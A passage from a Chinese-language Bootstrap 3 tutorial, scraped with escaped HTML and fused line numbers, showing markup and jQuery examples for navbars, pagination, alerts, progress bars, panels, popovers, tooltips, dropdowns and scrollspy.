href=\"\"&gt;Project&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"\"&gt;Message&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt; 胶囊式标签页 nav-pills 12345&lt;ul class=\"nav nav-pills\"&gt; &lt;li class=\"active\"&gt;&lt;a href=\"\"&gt;Home&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"\"&gt;Project&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"\"&gt;Message&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt; 垂直的胶囊式标签页 nav-stacked 12345&lt;ul class=\"nav nav-pills nav-stacked\"&gt; &lt;li class=\"active\"&gt;&lt;a href=\"\"&gt;Home&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"\"&gt;Project&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"\"&gt;Message&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt; 两端对齐的标签页 nav-justified 12345&lt;ul class=\"nav nav-pills nav-justified\"&gt; &lt;li class=\"active\"&gt;&lt;a href=\"\"&gt;Home&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"\"&gt;Project&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"\"&gt;Message&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt; 禁用链接 disabled 12345&lt;ul class=\"nav nav-tabs\"&gt; &lt;li class=\"active\"&gt;&lt;a href=\"\"&gt;Home&lt;/a&gt;&lt;/li&gt; &lt;li class=\"disabled\"&gt;&lt;a href=\"\"&gt;Project&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"\"&gt;Message&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt; 带有下拉菜单的标签 123456789101112&lt;ul class=\"nav nav-tabs\"&gt; &lt;li class=\"active\"&gt;&lt;a href=\"\"&gt;Home&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"\"&gt;Project&lt;/a&gt;&lt;/li&gt; &lt;li class=\"dropdown\"&gt; &lt;a href=\"\" class=\"dropdown-toggle\" data-toggle=\"dropdown\"&gt;Message &lt;span class=\"caret\"&gt;&lt;/span&gt;&lt;/a&gt; &lt;ul class=\"dropdown-menu\"&gt; &lt;li&gt;&lt;a href=\"\"&gt;关于&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"\"&gt;资讯&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"\"&gt;通讯&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/li&gt;&lt;/ul&gt; 带下拉菜单的胶囊式标签 123456789101112&lt;ul class=\"nav nav-pills\"&gt; &lt;li class=\"active\"&gt;&lt;a href=\"\"&gt;Home&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"\"&gt;Project&lt;/a&gt;&lt;/li&gt; &lt;li class=\"dropdown\"&gt; &lt;a href=\"\" class=\"dropdown-toggle\" data-toggle=\"dropdown\"&gt;Message &lt;span class=\"caret\"&gt;&lt;/span&gt;&lt;/a&gt; &lt;ul class=\"dropdown-menu\"&gt; &lt;li&gt;&lt;a href=\"\"&gt;关于&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"\"&gt;资讯&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"\"&gt;通讯&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/li&gt;&lt;/ul&gt; 导航条 navbar &lt;nav&gt;标签中添加 class .navbar、.navbar-default 默认的导航栏 1234567891011121314151617&lt;nav class=\"navbar navbar-default\"&gt; &lt;div class=\"navbar-header\"&gt; &lt;a class=\"navbar-brand\" href=\"\"&gt;poetries blog&lt;/a&gt; &lt;/div&gt; &lt;ul class=\"nav navbar-nav\"&gt; &lt;li class=\"active\"&gt;&lt;a href=\"\"&gt;Home&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"\"&gt;Project&lt;/a&gt;&lt;/li&gt; &lt;li class=\"dropdown\"&gt; &lt;a href=\"\" class=\"dropdown-toggle\" data-toggle=\"dropdown\"&gt;Message &lt;span class=\"caret\"&gt;&lt;/span&gt;&lt;/a&gt; &lt;ul class=\"dropdown-menu\"&gt; &lt;li&gt;&lt;a href=\"\"&gt;关于&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"\"&gt;资讯&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"\"&gt;通讯&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/li&gt; &lt;/ul&gt;&lt;/nav&gt; 响应式的导航栏 123456789101112131415161718192021222324&lt;nav class=\"navbar navbar-default\"&gt; &lt;div class=\"navbar-header\"&gt; &lt;button class=\"navbar-toggle\" data-toggle=\"collapse\" data-target=\"#navbar-collapse\"&gt; &lt;span class=\"icon-bar\"&gt;&lt;/span&gt; &lt;span class=\"icon-bar\"&gt;&lt;/span&gt; &lt;span class=\"icon-bar\"&gt;&lt;/span&gt; &lt;/button&gt; &lt;a class=\"navbar-brand\" href=\"\"&gt;教育&lt;/a&gt; &lt;/div&gt; &lt;div class=\"collapse navbar-collapse\" id=\"navbar-collapse\"&gt; &lt;ul class=\"nav navbar-nav\"&gt; &lt;li class=\"active\"&gt;&lt;a href=\"\"&gt;Home&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"\"&gt;Project&lt;/a&gt;&lt;/li&gt; &lt;li class=\"dropdown\"&gt; &lt;a href=\"\" class=\"dropdown-toggle\" data-toggle=\"dropdown\"&gt;Message &lt;span class=\"caret\"&gt;&lt;/span&gt;&lt;/a&gt; &lt;ul class=\"dropdown-menu\"&gt; &lt;li&gt;&lt;a href=\"\"&gt;关于&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"\"&gt;资讯&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"\"&gt;通讯&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt;&lt;/nav&gt; 导航栏中的表单 123456&lt;form action=\"\" class=\"navbar-form navbar-right\"&gt; &lt;div class=\"form-group\"&gt; &lt;input class=\"form-control\" type=\"text\" placeholder=\"Search\"/&gt; &lt;/div&gt; &lt;button class=\"btn btn-default\"&gt;Search&lt;/button&gt;&lt;/form&gt; 导航栏中的按钮 navbar-btn 1&lt;button class=\"btn btn-default navbar-btn\"&gt;Submit&lt;/button&gt; 导航栏中的文本 navbar-text 1&lt;p class=\"navbar-text\"&gt;Signed in as Thomas&lt;/p&gt; 固定到顶部、底部 navbar-fixed-top navbar-fixed-bottom 1234567891011121314151617&lt;nav class=\"navbar navbar-default navbar-fixed-top\"&gt; &lt;div class=\"navbar-header\"&gt; &lt;a class=\"navbar-brand\" href=\"\"&gt;教育&lt;/a&gt; &lt;/div&gt; &lt;ul class=\"nav navbar-nav\"&gt; &lt;li class=\"active\"&gt;&lt;a href=\"\"&gt;Home&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"\"&gt;Project&lt;/a&gt;&lt;/li&gt; &lt;li class=\"dropdown\"&gt; &lt;a href=\"\" class=\"dropdown-toggle\" data-toggle=\"dropdown\"&gt;Message &lt;span class=\"caret\"&gt;&lt;/span&gt;&lt;/a&gt; &lt;ul class=\"dropdown-menu\"&gt; &lt;li&gt;&lt;a href=\"\"&gt;关于&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"\"&gt;资讯&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"\"&gt;通讯&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/li&gt; &lt;/ul&gt;&lt;/nav&gt; 静态的顶部 navbar-static-top 倒置的导航栏 带有黑色背景白色文本的倒置的导航栏 navbar-inverse 面包屑导航 12345&lt;ul class=\"breadcrumb\"&gt; &lt;li&gt;&lt;a href=\"\"&gt;首页&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"\"&gt;列表&lt;/a&gt;&lt;/li&gt; &lt;li class=\"active\"&gt;详情&lt;/li&gt;&lt;/ul&gt; 八、分页、标签、徽章、巨幕、页头、缩略图、警告框组件 分页 默认的分页 1234567&lt;ul class=\"pagination\"&gt; &lt;li&gt;&lt;a href=\"\"&gt;«&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"\"&gt;1&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"\"&gt;2&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"\"&gt;3&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"\"&gt;»&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt; 禁用和激活状态 1234567&lt;ul class=\"pagination\"&gt; &lt;li class=\"disabled\"&gt;&lt;a href=\"\"&gt;«&lt;/a&gt;&lt;/li&gt; &lt;li class=\"active\"&gt;&lt;a href=\"\"&gt;1&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"\"&gt;2&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"\"&gt;3&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"\"&gt;»&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt; 分页的尺寸 pagination-lg pagination-sm 翻页（Pager） 1234&lt;ul class=\"pager\"&gt; &lt;li&gt;&lt;a href=\"\"&gt;previous&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"\"&gt;next&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt; 对齐的链接 1234&lt;ul class=\"pager\"&gt; &lt;li class=\"previous\"&gt;&lt;a href=\"\"&gt;← previous&lt;/a&gt;&lt;/li&gt; &lt;li class=\"next\"&gt;&lt;a href=\"\"&gt;next →&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt; 可选的禁用状态 1234&lt;ul class=\"pager\"&gt; &lt;li class=\"previous disabled\"&gt;&lt;a href=\"\"&gt;← previous&lt;/a&gt;&lt;/li&gt; &lt;li class=\"next\"&gt;&lt;a href=\"\"&gt;next →&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt; 标签 123456&lt;span class=\"label label-default\"&gt;Default&lt;/span&gt;&lt;span class=\"label label-primary\"&gt;Primary&lt;/span&gt;&lt;span class=\"label label-success\"&gt;Success&lt;/span&gt;&lt;span class=\"label label-info\"&gt;Info&lt;/span&gt;&lt;span class=\"label label-warning\"&gt;Warning&lt;/span&gt;&lt;span class=\"label label-danger\"&gt;Danger&lt;/span&gt; 徽章badge 12&lt;a href=\"\"&gt;Messages &lt;span class=\"badge\"&gt;20&lt;/span&gt;&lt;/a&gt;&lt;button class=\"btn btn-default\"&gt;Messages &lt;span class=\"badge\"&gt;20&lt;/span&gt;&lt;/button&gt; 巨幕 jumbotron 12345678&lt;div class=\"jumbotron\"&gt; &lt;div class=\"container\"&gt; &lt;h1&gt;hello world!!!&lt;/h1&gt; &lt;p&gt;This is a simple hero unit, a simple jumbotron-style component for calling extra attention to featured content or information.&lt;/p&gt; &lt;p&gt;&lt;a class=\"btn btn-primary\" href=\"\"&gt;Learn more&lt;/a&gt;&lt;/p&gt; &lt;/div&gt;&lt;/div&gt; 页头 page-header 12345&lt;div class=\"page-header\"&gt; &lt;h1&gt;Example page header &lt;small&gt;Subtext for header&lt;/small&gt; &lt;/h1&gt;&lt;/div&gt; 缩略图 默认样式 12345&lt;div class=\"col-md-3 col-sm-6\"&gt; &lt;a class=\"thumbnail\" href=\"\"&gt; &lt;img src=\"images/kittens.jpg\" alt=\"\"/&gt; &lt;/a&gt;&lt;/div&gt; 自定义内容 12345678910111213&lt;div class=\"col-md-3 col-sm-6\"&gt; &lt;div class=\"thumbnail\"&gt; &lt;img src=\"images/kittens.jpg\" alt=\"\"/&gt; &lt;div class=\"caption\"&gt; &lt;!--text-center--&gt; &lt;h3&gt;缩略图标签&lt;/h3&gt; &lt;p&gt;一些示例文本。一些示例文本。&lt;/p&gt; &lt;p&gt; &lt;a href=\"#\" class=\"btn btn-primary\" role=\"button\"&gt;按钮&lt;/a&gt; &lt;a href=\"#\" class=\"btn btn-default\" role=\"button\"&gt;按钮 &lt;/a&gt; &lt;/p&gt; &lt;/div&gt; &lt;/div&gt;&lt;/div&gt; 警告框 基本默认样式 1234&lt;div class=\"alert alert-success\"&gt;成功！很好地完成了提交。&lt;/div&gt;&lt;div class=\"alert alert-info\"&gt;信息！请注意这个信息。&lt;/div&gt;&lt;div class=\"alert alert-warning\"&gt;警告！请不要提交。&lt;/div&gt;&lt;div class=\"alert alert-danger\"&gt;错误！请进行一些更改。&lt;/div&gt; 可关闭的警告框&lt;button type=&quot;button&quot; class=&quot;close&quot; data-dismiss=&quot;alert&quot;&gt;×&lt;/button&gt; 警告中的链接 123&lt;div class=\"alert alert-success\"&gt; &lt;a href=\"#\" class=\"alert-link\"&gt;成功！很好地完成了提交。&lt;/a&gt;&lt;/div&gt; 九、进度条、媒体对象、列表组、面板、响应式插入组件 进度条 默认的进度条 123&lt;div class=\"progress\"&gt; &lt;div class=\"progress-bar\" style=\"width:45%;\"&gt;45%&lt;/div&gt;&lt;/div&gt; 情景变化的进度条 123456789101112&lt;div class=\"progress\"&gt; &lt;div class=\"progress-bar progress-bar-info\" style=\"width:60%;\"&gt;60%&lt;/div&gt;&lt;/div&gt;&lt;div class=\"progress\"&gt; &lt;div class=\"progress-bar progress-bar-success\" style=\"width:25%;\"&gt;25%&lt;/div&gt;&lt;/div&gt;&lt;div class=\"progress\"&gt; &lt;div class=\"progress-bar progress-bar-danger\" style=\"width:45%;\"&gt;45%&lt;/div&gt;&lt;/div&gt;&lt;div class=\"progress\"&gt; &lt;div class=\"progress-bar progress-bar-warning\" style=\"width:45%;\"&gt;45%&lt;/div&gt;&lt;/div&gt; 条纹的进度条 progress-striped 123&lt;div class=\"progress progress-striped\"&gt; &lt;div class=\"progress-bar\" style=\"width:45%;\"&gt;45%&lt;/div&gt;&lt;/div&gt; 动画的进度条active 123&lt;div class=\"progress progress-striped active\"&gt; &lt;div class=\"progress-bar\" style=\"width:45%;\"&gt;45%&lt;/div&gt;&lt;/div&gt; 堆叠的进度条 1234&lt;div class=\"progress\"&gt; &lt;div class=\"progress-bar progress-bar-warning\" style=\"width:45%;\"&gt;45%&lt;/div&gt; &lt;div class=\"progress-bar progress-bar-success\" style=\"width:25%;\"&gt;25%&lt;/div&gt;&lt;/div&gt; 媒体对象 1234567891011&lt;div class=\"media\"&gt; &lt;a href=\"\" class=\"pull-left\"&gt;&lt;img class=\"media-object\" src=\"images/kittens.jpg\" alt=\"\" width=\"95\"/&gt;&lt;/a&gt; &lt;div class=\"media-body\"&gt; &lt;h4 class=\"media-heading\"&gt;媒体标题&lt;/h4&gt; 这是一些示例文本。这是一些示例文本。 这是一些示例文本。这是一些示例文本。 这是一些示例文本。这是一些示例文本。 这是一些示例文本。这是一些示例文本。 这是一些示例文本。这是一些示例文本。 &lt;/div&gt;&lt;/div&gt; 列表组 向列表组添加国徽 12345&lt;ul class=\"list-group\"&gt; &lt;li class=\"list-group-item\"&gt;&lt;a href=\"\"&gt;免费域名注册 &lt;span class=\"badge pull-right\"&gt;20&lt;/span&gt;&lt;/a&gt;&lt;/li&gt; &lt;li class=\"list-group-item\"&gt;&lt;a href=\"\"&gt;免费 Window 空间托管&lt;/a&gt;&lt;/li&gt; &lt;li class=\"list-group-item\"&gt;&lt;a href=\"\"&gt;每年更新成本&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt; 向列表组添加链接 12345&lt;div class=\"list-group\"&gt; &lt;a href=\"\" class=\"list-group-item active\"&gt;免费域名注册&lt;/a&gt; &lt;a href=\"\" class=\"list-group-item\"&gt;免费 Window 空间托管&lt;/a&gt; &lt;a href=\"\" class=\"list-group-item\"&gt;每年更新成本&lt;/a&gt;&lt;/div&gt; 向列表组添加自定义内容 1234567&lt;ul class=\"list-group\"&gt;&lt;li class=\"list-group-item\"&gt;Cras justo odio&lt;/li&gt;&lt;li class=\"list-group-item\"&gt;Dapibus ac facilisis in&lt;/li&gt;&lt;li class=\"list-group-item\"&gt;Morbi leo risus&lt;/li&gt;&lt;li class=\"list-group-item\"&gt;Porta ac consectetur ac&lt;/li&gt;&lt;li class=\"list-group-item\"&gt;Vestibulum at eros&lt;/li&gt;&lt;/ul&gt; 面板 面板标题 1&lt;div class=\"panel-heading\"&gt;标题&lt;/div&gt; 面板脚注 1&lt;div class=\"panel-footer text-right\"&gt;by zichen&lt;/div&gt; 面板主题 12345&lt;div class=\"panel panel-primary\"&gt;...&lt;/div&gt;&lt;div class=\"panel panel-success\"&gt;...&lt;/div&gt;&lt;div class=\"panel panel-info\"&gt;...&lt;/div&gt;&lt;div class=\"panel panel-warning\"&gt;...&lt;/div&gt;&lt;div class=\"panel panel-danger\"&gt;...&lt;/div&gt; 带表格的面板 12345678910&lt;div class=\"panel panel-default\"&gt; &lt;div class=\"panel-heading\"&gt;Panel heading&lt;/div&gt; &lt;table class=\"table\"&gt; &lt;tr&gt; &lt;td&gt;学号&lt;/td&gt; &lt;td&gt;姓名&lt;/td&gt; &lt;td&gt;年龄&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt;&lt;/div&gt; 带列表组的面板 123456789101112&lt;div class=\"panel panel-danger\"&gt; &lt;div class=\"panel-heading\"&gt;标题&lt;/div&gt; &lt;div class=\"panel-body\"&gt;面板内容显示区域&lt;/div&gt; &lt;ul class=\"list-group\"&gt; &lt;li class=\"list-group-item\"&gt;免费域名注册&lt;/li&gt; &lt;li class=\"list-group-item\"&gt;免费 Window 空间托管&lt;/li&gt; &lt;li class=\"list-group-item\"&gt;图像的数量&lt;/li&gt; &lt;li class=\"list-group-item\"&gt;24*7 支持&lt;/li&gt; &lt;li class=\"list-group-item\"&gt;每年更新成本&lt;/li&gt; &lt;/ul&gt; &lt;div class=\"panel-footer text-right\"&gt;by zichen&lt;/div&gt;&lt;/div&gt; 响应式嵌入组件 根据被嵌入内容的外部容器的宽度，自动创建一个固定的比例，从而让浏览器自动确定 内容的尺寸，能够在各种设备上缩放 这些规则可以直接用于&lt;iframe&gt;、&lt;embed&gt;、&lt;video&gt;和&lt;object&gt;元素。 16:9 响应式 123&lt;div class=\"embed-responsive embed-responsive-16by9\"&gt; &lt;embed width=\"100%\" height=\"100%\" src=\"https://www.youtube.com/embed/zpOULjyy-n8?rel=0\"&gt;&lt;/embed&gt;&lt;/div&gt; 4:3 响应式 123456789&lt;div class=\"embed-responsive embed-responsive-4by3\"&gt; &lt;embed width=\"100%\" height=\"100%\" src=\"https://www.youtube.com/embed/zpOULjyy-n8?rel=0\"&gt;&lt;/embed&gt;&lt;/div&gt;&lt;div class=\"embed-responsive embed-responsive-16by9\"&gt; &lt;iframe class=\"embed-responsive-item\" src=\"https://www.youtube.com/embed/zpOULjyy-n8?rel=0\"&gt;&lt;/iframe&gt;&lt;/div&gt;&lt;div class=\"embed-responsive embed-responsive-4by3\"&gt; &lt;iframe class=\"embed-responsive-item\" src=\"https://www.youtube.com/embed/zpOULjyy-n8?rel=0\"&gt;&lt;/iframe&gt;&lt;/div&gt; well 基本的well 1&lt;div class=\"well\"&gt;您好，我在大的 Well 中！&lt;/div&gt; 尺寸大小 well-lg well-sm 12&lt;div class=\"well well-lg\"&gt;您好，我在大的 Well 中！&lt;/div&gt;&lt;div class=\"well well-sm\"&gt;您好，我在小的 Well 中！&lt;/div&gt; 十、弹出框、警告框、标签页和工具提示插件插件 弹出框 弹出框点击一个元素，弹出一个包含标题和内容的容器 1234//基本用法&lt;button class=\"btn btn-lg btn-danger\" type=\"button\" data-toggle=\"popover\" title=\"弹出框\" data-content=\"这是一个弹出框插件\"&gt; 点击弹出/隐藏弹出框&lt;/button&gt; JavaScript 初始化 $(&#39;button&#39;).popover(); Popover 插件中的属性： data-animation 默认 true，在 popover 上应用一个 CSS fade 动画。 如果设置 false，则不应用。 data-html 默认 false，不允许提示内容格式为 html。如果设置 为 true，则可以设置 html 格式的提示内容 data-placement 默认值 top，还有 bottom、left、right 和 auto。 如果auto会自行调整合适的位置，如果是auto left 则会尽量在左边显示，但左边不行就靠右边。 data-selector 默认 false，可以选择绑定指定的选择器。 data-original-title 默认空字符串，弹出框的标题。优先级比 title 低 title 默认字空符串，弹出框的标题。 data-trigger 默认值 click，表示怎么触发 popover，其他值为： hover、focus、manual。多个值用空格隔开，manual 手动不能和其他同时设置。 data-delay 默认值 0，延迟触发 popover(毫秒)，如果传数字则， 表示 show/hide 的毫秒数，如果传对象，结构为： {show:500,hide:100} data-container 默认值 false，将 popover 附加到特定的元素上。比 如组合按钮组提示，容器不够，可以附加 body 上。container : &#39;body&#39; data-template 更改提示框的 HTML 提示语的模版，默认值为： 12345&lt;div class=\"popover\"&gt; &lt;div class=\"arrow\"&gt;&lt;/div&gt; &lt;h3 class=\"popover-title\"&gt;&lt;/h3&gt; &lt;div class=\"popover-content\"&gt;&lt;/div&gt;&lt;/div&gt; data-content 默认值为空，弹出框的内容。 data-viewport 设置外围容器的边际，具体代码看示例。 1234567 $('button').popover(&#123;trigger:\"click\",placement:\"right\",viewport : &#123; selector : '#view'&#125; &#125;); Popover 插件中的方法： 显示 $(&#39;button&#39;).popover(&#39;show&#39;); 隐藏 $(&#39;button&#39;).popover(&#39;hide&#39;); 反转显示和隐藏 $(&#39;button&#39;).popover(&#39;toggle&#39;); 隐藏并销毁 $(&#39;button&#39;).popover(&#39;destroy&#39;); Popover 插件中的事件： show.bs.popover 在调用 show 方法时触发 shown.bs.popover 在显示整个弹窗时时触发 hide.bs.popover 在调用 hide 方法时触发 hidden.bs.popover 在完全关闭整个弹出时触发 123$('button').on('show.bs.tab', function () &#123; alert('调用 show 方法时触发！');&#125;); 警告框 警告框即为点击小时的信息框 1234567//基本实例&lt;div class=\"alert alert-warning\"&gt; &lt;button class=\"close\" type=\"button\" data-dismiss=\"alert\"&gt; &lt;span&gt;×&lt;/span&gt; &lt;/button&gt; &lt;p&gt;警告：您的浏览器不支持！&lt;/p&gt;&lt;/div&gt; 添加淡入淡出效果 &lt;div class=&quot;alert alert-warning fade in&quot;&gt; 如果用 JavaScript，可以代替 data-dismiss=&quot;alert&quot; Alert 插件中的方法： 123$('.close').on('click', function () &#123; $('#alert').alert('close');&#125;) Alert 插件中的事件： close.bs.alert 当 close 方法被调用后立即触发 closed.bs.alert 当警告框被完全关闭后立即触发 123$('#alert').on('close.bs.alert', function () &#123; alert('当 close 方法被触发时调用！');&#125;); 标签页 标签页也就是通常所说的选项卡功能 12345678910111213//基本用法&lt;ul class=\"nav nav-tabs\"&gt; &lt;li class=\"active\"&gt;&lt;a href=\"#html5\" data-toggle=\"tab\"&gt;HTML5&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"#bootstrap\" data-toggle=\"tab\"&gt;Bootstrap&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"#jquery\" data-toggle=\"tab\"&gt;jQuery&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"#extjs\" data-toggle=\"tab\"&gt;ExtJS&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;div class=\"tab-content\" style=\"padding: 10px;\"&gt; &lt;div class=\"tab-pane active\" id=\"html5\"&gt;...&lt;/div&gt; &lt;div class=\"tab-pane\" id=\"bootstrap\"&gt;...&lt;/div&gt; &lt;div class=\"tab-pane\" id=\"jquery\"&gt;...&lt;/div&gt; &lt;div class=\"tab-pane\" id=\"extjs\"&gt;...&lt;/div&gt;&lt;/div&gt; 可以设置淡入淡出效果 fade，而 in 表示首选的内容默认显示 1&lt;div class=\"tab-pane fade in active\" id=\"html5\"&gt; 也可以换成胶囊式 1&lt;ul class=\"nav nav-pills\"&gt; data-target 使用 data-target 绑定或不绑定效果都是一样的 Tab 插件中的方法： 1234$('#nav a').on('click', function (e) &#123; e.preventDefault(); $(this).tab('show');&#125;); Tab 插件中的事件： show.bs.tab 在调用 tab 方法时触发 shown.bs.tab 在显示整个标签时触发 123$('#nav a').on('show.bs.tab', function () &#123; alert('调用 tab 时触发！');&#125;); 工具提示 工具提示就是通过鼠标移动选定在特定的元素上时，显示相关的提示语 12//基本实例&lt;a href=\"#\" data-toggle=\"tooltip\" title=\"超文本标识符\"&gt;HTML5&lt;/a&gt; JavaScript 初始化 $(&#39;#section&#39;).tooltip(); data-animation 默认 true，在 tooltip 上应用一个 CSS fade 动画。 如果设置 false，则不应用。 data-html 默认 false，不允许提示内容格式为 html。如果设置 为 true，则可以设置 html 格式的提示内容。 data-placement 默认值 top，还有 bottom、left、right 和 auto。 如果auto会自行调整合适的位置，如果是auto left 则会尽量在左边显示，但左边不行就靠右边。 data-selector 默认 false，可以选择绑定指定的选择器。 rel=&quot;tooltip&quot; data-original-title 默认空字符串，提示语的内容。优先级比 title 低 title 默认字空符串，提示语的内容。 data-trigger 默认值 hover foucs，表示怎么触发 tooltip，其 他值为：click、manual。多个值用空格隔开，manual 手动不能和其他同时设置。 data-delay 默认值 0，延迟触发 tooltip(毫秒)，如果传数字则， 表示 show/hide 的毫秒数，如果传对象，结构为：{ show:500,hide:100 } data-container 默认值 false，将tooltip 附加到特定的元素上。比 如组合按钮组提示，容器不够，可以附加 body 上。container : &#39;body&#39; data-template 更改提示框的 HTML 提示语的模版，默认值为： 12345678910111213141516&lt;div class='tooltip'&gt; &lt;div class='tooltip-arrow'&gt;&lt;/div&gt; &lt;div class='tooltip-inner'&gt;&lt;/div&gt;&lt;/div&gt;&lt;a href=\"#\" rel=\"tooltip\" data-toggle=\"tooltip\" title=\"超文本标识符\" data-animation=\"false\" data-html=\"true\" data-placement=\"auto\" data-selector=\"a[rel=tooltip]\" data-trigger=\"click\" data-delay=\"500\" data-template=\"&lt;b&gt;123&lt;/b&gt;\" &gt;HTML5&lt;/a&gt; 123456$('#selector a').tooltip(&#123; delay : &#123; show : 500, hide : 100, &#125;,&#125;); Tooltip插件中的方法： 显示 $(&#39;#section a&#39;).tooltip(&#39;show&#39;); 隐藏 $(&#39;#section a&#39;).tooltip(&#39;hide&#39;); 反转显示和隐藏 $(&#39;#section a&#39;).tooltip(&#39;toggle&#39;); 隐藏并销毁 $(&#39;#section a&#39;).tooltip(&#39;destroy&#39;); Tooltip插件中的事件： show.bs.tooltip 在 show 方法调用时立即触发 shown.bs.tooltip 在提示框完全显示给用户之后触发 hide.bs.tooltip 在 hide 方法调用时立即触发 hidden.bs.tooltip 在提示框完全隐藏之后触发 12345678$('#select a').on('show.bs.tooltip', function () &#123; alert('调用 show 时触发！');&#125;);//data-selector$(\"#selector\").tooltip(&#123; selector:\"a[rel='tooltip']\"&#125;); data-container 12345&lt;div class=\"btn-group\"&gt; &lt;button class=\"btn btn-default\" title=\"超文本标记符\"&gt;left&lt;/button&gt; &lt;button class=\"btn btn-default\" title=\"超文本标记符\"&gt;middle&lt;/button&gt; &lt;button class=\"btn btn-default\" title=\"超文本标记符\"&gt;right&lt;/button&gt;&lt;/div&gt; 1234567$(\"button\").tooltip(&#123; delay:&#123; show:500, hide:100 &#125;, container:\"body\"&#125;); 十一、下拉菜单、滚动监听、按钮和折叠插件 下拉菜单插件 123456789&lt;div class=\"dropdown\"&gt; &lt;button class=\"btn btn-primary\" data-toggle=\"dropdown\"&gt; 下拉菜单 &lt;span class=\"caret\"&gt;&lt;/span&gt; &lt;/button&gt; &lt;ul class=\"dropdown-menu\"&gt; &lt;li&gt;&lt;a href=\"#\"&gt;首页&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"#\"&gt;产品&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"#\"&gt;资讯&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"#\"&gt;关于&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt;&lt;/div&gt; 如果按钮在容器外部，可以通过 data-target 进行绑定 1&lt;button class=\"btn btn-primary\" id=\"btn\" data-toggle=\"dropdown\" data-target=\"#dropdown\"&gt; Dropdown插件的方法：，但仍然需要 data-* $(&#39;#btn&#39;).dropdown(); $(&#39;#btn&#39;).dropdown(&#39;toggle&#39;); Dropdown插件的事件： show.bs.dropdown 在 show 方法调用时立即触发。 shown.bs.dropdown 在下拉菜单完全显示出来，并且等 CSS 动画完成之后 触发。 hide.bs.dropdown 在 hide 方法调用时，但还未关闭隐藏时触发。 hidden.bs.dropdown 在下拉菜单完全隐藏之后，并且等 CSS 动画完成之后 触发。 123$('#dropdown').on('show.bs.dropdown', function () &#123; alert('在调用 show 方法时立即触发！');&#125;); 滚动监听插件 data-offset 默认值为 10，固定弄内容距滚动容器 10 像素以内， 就高亮显示所对应的菜单 data-spy 设置 scroll，将设置滚动容器监听 data-target 设置#nav，绑定指定监听的菜单 scroll插件的方法： 1234$(\"#scroll\").scrollspy(&#123; //offset: 0, target: \"#nav\"&#125;); activate.bs.scrollspy 每当一个新条目被激活后都将由滚动监听插件触 发此事件。 事件绑定在导航上 123$('#nav').on('activate.bs.scrollspy', function () &#123; alert('新条目被激活后触发此事件！');&#125;); 滚动监听还有一个更新容器 DOM 的方法 refresh 更新容器 DOM 的方法 1234function removeSec(e) &#123; $(e).parents('.sec').remove(); $('#content').scrollspy('refresh');&#125; 按钮插件 单个切换 1&lt;button class=\"btn btn-primary\" data-toggle=\"button\" autocomplete=\"off\"&gt;单个切换&lt;/button&gt; 注：在 Firefox 多次页面加载时，按钮可能保持表单的禁用或选择状态。解决方案是： 添加autocomplete=&quot;off&quot;。 单选按钮 12345678&lt;div 